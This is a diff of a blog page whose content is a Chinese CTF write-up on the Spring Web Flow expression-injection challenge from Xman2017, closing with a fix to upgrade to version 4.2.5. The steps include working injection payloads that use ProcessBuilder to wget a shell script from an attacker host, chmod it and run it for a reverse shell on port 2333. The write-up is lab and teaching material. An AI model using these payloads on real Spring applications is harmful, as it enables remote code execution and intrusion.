@@ -162,24 +162,24 @@ for i in range (0,500):
 <h1 id="Spring-Xman2017原题"><a href="#Spring-Xman2017原题" class="headerlink" title="Spring(Xman2017原题)"></a>Spring(Xman2017原题)</h1><p>反弹shell</p>
 <p><a target="_blank" rel="noopener" href="http://blog.cyberpeace.cn/Spring-Web-Flow/">http://blog.cyberpeace.cn/Spring-Web-Flow/</a></p>
 <p>1.点击页面中的超链接进入图书搜索页面，在页面中输入搜索内容进行搜索</p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/1.png" alt="1"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/1.png" alt="1"></p>
 <p>2.搜索到图书点击View hotel按钮，然后点击Book hotel按钮，如果没有登录请先登录（登录名密码圈出来了，4种任意都可以登录）</p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/2.png" alt="2"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/2.png" alt="2"></p>
 <p>3.进入借书页面，随意写入16位Credit Card id和Credit Card Name点击Process按钮</p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/3.png" alt="3"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/3.png" alt="3"></p>
 <p>4.在点击Confirm按钮前我们需要进行burpsuite进行拦截抓包，截获数据包send to repeater，篡改数据包添加恶意payload：<code>&amp;_(new+java.lang.ProcessBuilder("/usr/bin/wget","-P/tmp","http://192.168.159.128/shell.sh")).start()=feifei</code>，shell.sh放在可以访问的服务器中，执行请求包。</p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/4.png" alt="4"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/4.png" alt="4"></p>
 <p>5.查看自己虚拟机的/tmp目录下有没有成功下shell.sh,可以看到shell.sh成功下载</p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/5.png" alt="5"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/5.png" alt="5"></p>
 <p>6.至此已经复现了漏洞，可是我们既然想代码执行，那我们就可以进行反弹shell操作，继续执行命令，添加payload：<code>&amp;_(new+java.lang.ProcessBuilder("/bin/chmod","777","/tmp/shell.sh")).start()=feifei</code>对shell.sh修改权限</p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/6.png" alt="6"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/6.png" alt="6"></p>
 <p>7.查看虚拟机中的/tmp目录下的shell.sh有没有变成可读可写可执行权限，可以看到shell.sh权限成功变成777</p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/7.png" alt="7"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/7.png" alt="7"></p>
 <p>8.执行shell.sh文件同时监听2333端口，执行payload:<code>&amp;_(new+java.lang.ProcessBuilder("/bin/bash","/tmp/shell.sh")).start()=feifei</code></p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/8.png" alt="8"></p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/9.png" alt="9"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/8.png" alt="8"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/9.png" alt="9"></p>
 <p>9.在监听的服务器中查看监听的2333端口有没有反弹shell，可以看到成功反弹shell，可以执行权限内任意命令。 </p>
-<p><img src="/%E9%B9%A4%E5%9F%8E%E6%9D%AF2021.assets/10.png" alt="10"></p>
+<p><img src="/2021/10/08/he-cheng-bei-2021/10.png" alt="10"></p>
 <h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>  升级Spring Web Flow版本到4.2.5</p>
 
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
